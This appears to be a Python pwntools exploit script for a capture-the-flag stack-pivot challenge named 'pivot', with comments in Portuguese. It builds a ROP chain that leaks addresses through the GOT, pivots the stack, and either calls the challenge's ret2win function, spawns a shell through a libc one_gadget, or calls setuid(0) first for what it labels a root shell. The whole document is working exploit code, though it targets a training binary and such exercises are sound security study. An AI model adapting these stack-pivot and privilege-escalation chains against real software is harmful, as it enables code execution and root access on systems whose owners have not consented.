# Pivot
```
3d3523f651e7730be0c7c2347ab109dd0842dc29cec3d5fe0c868afc6803026c  pivot
8de035bdc097b881c2118c09ce995b78f49019582cfe6e1b3a584dbebe1c3481  libpivot.so
```
```py
#!/usr/bin/python3
from pwn import *
from time import sleep

# --------------------------------------------------  
# Inicializar
# --------------------------------------------------  
if args.LOG: context.log_level = "info"
else       : context.log_level = "critical"

binary = ELF("pivot")
libc = binary.libc

io = process(binary.path)
io.recvuntil("pivot: ")
leak = int(io.recv(14)[2::],16)
log.info("Leak: "+hex(leak))

io.recvuntil("> ")

# --------------------------------------------------  
# Gadgets
# --------------------------------------------------
# Misc
pop_rdi = p64(0x0000000000400a33) 
pop_rax = p64(0x00000000004009bb)
pop_rbp = p64(0x00000000004007c8)
add_rax_rbp = p64(0x00000000004009c4) 
pop_rsi_r15 = p64(0x0000000000400a31) 


# Pivot
xchg_rsp = p64(0x00000000004009bd) # xchg rax, rsp; ret; 

# Read
mov_eax_rax = p64(0x00000000004009c1) # mov eax, dword ptr [rax]; ret;

# Exec
call_rax = p64(0x00000000004006b0) # call rax; depois coloca um lixin p64 
pop_r12_13_14_15 = p64(0x0000000000400a2c) 
one_gadget = 0xcbd1a
# 0xcbd1a execve("/bin/sh", r12, r13)
# constraints:
 # [r12] == NULL || r12 == NULL
 # [r13] == NULL || r13 == NULL

# --------------------------------------------------  
# Primeira Fase
# --------------------------------------------------  
fase1 = b""
fase1 += b"B"*40
fase1 += pop_rax   
fase1 += p64(leak) # leak == fase2
fase1 += xchg_rsp  # rsp == fase2

# Entao, caso coloquemos uma ROP chain no leak, ela sera executada

# --------------------------------------------------  
# Segunda Fase
# --------------------------------------------------  
def get_shell():
	fase2 = b''
	# Ler a got de puts
	fase2 += pop_rax 
	fase2 += p64(binary.got.puts)
	fase2 += mov_eax_rax # mov eax [rax]

	# agora temos o FINAL de puts em rax
	# inicio do puts == ao do leak
	# Entao podemos calcular o resto dele a partir do leak
	# leak  = 0x7fb5       27 4a 9f 10 
	# final = 0x           27 52 45 f0
	# (leak >> 4*8  << 4*8) + final_puts == puts
	# 0x7fb500000000 + final_puts = 0x7fb5275245f0 (puts)

	# calcular o endereco do one_gadget usando puts como referencia
	fase2 += pop_rbp
	fase2 += p64( (leak >> 4*8 << 4*8) - (libc.sym.puts - one_gadget) )
	fase2 += add_rax_rbp
	    # lembrete: libc.sym e um  offset dentro do libc (e o one_gadget tambem)

	# one gadget constraints r12 r13 == NULL
	fase2 += pop_r12_13_14_15
	fase2 += p64(0)*4 
	fase2 += call_rax

	return fase2

def privesc():
	setuid = b''
	# Ler a got de puts
	setuid += pop_rax
	setuid += p64(binary.got.puts)
	setuid += mov_eax_rax # mov eax [rax]
	
	# calcular o endereco de setuid usando puts como referencia
	setuid += pop_rbp
	setuid += p64( (leak >> 4*8 << 4*8) - (libc.sym.puts - libc.sym.setuid) )
	setuid += add_rax_rbp

	setuid += pop_rdi
	setuid += p64(0)
	setuid += call_rax
	setuid += p64(0)

	return setuid

def foothold():
	libpivot = ELF("libpivot.so")

	# Executar foothold_function para popular o got
	challenge = b''
	challenge += pop_rax
	challenge += p64(binary.plt.foothold_function)
	challenge += call_rax
	challenge += p64(0)

	# Ler a got de foothold_function
	challenge += pop_rax
	challenge += p64(binary.got.foothold_function)
	challenge += mov_eax_rax # mov eax [rax]
	
	# calcular o endereco de ret2win usando foothold como referencia
	challenge += pop_rbp
	challenge += p64( (leak >> 4*8 << 4*8) - (libpivot.sym.foothold_function - libpivot.sym.ret2win) )
	challenge += add_rax_rbp

	challenge += call_rax
	challenge += p64(0)

	return challenge

# --------------------------------------------------  
# :D
# --------------------------------------------------  
log.critical('''
ARGV modos:
	SHELL  - shell
	PRIV   - root shell
	CTF    - print flag 

ARGV debug: 
	SLEEP  - 5 seg
	LOG    - log verboso
''')

if args.SLEEP: sleep(5)

if args.CTF:
	fase2 = foothold()
elif args.PRIV:
	fase2 = privesc() + get_shell()
elif args.SHELL:
	fase2 = get_shell()
else:
	log.critical("Por favor, selecione um modo")
	quit()

io.sendline(fase2)
io.recvuntil("> ")

io.sendline(fase1)

if args.CTF:
	io.recvuntil("libpivot\n")
	log.critical(io.recv(128))
else:
	io.recvuntil("!\n")
	io.interactive()
```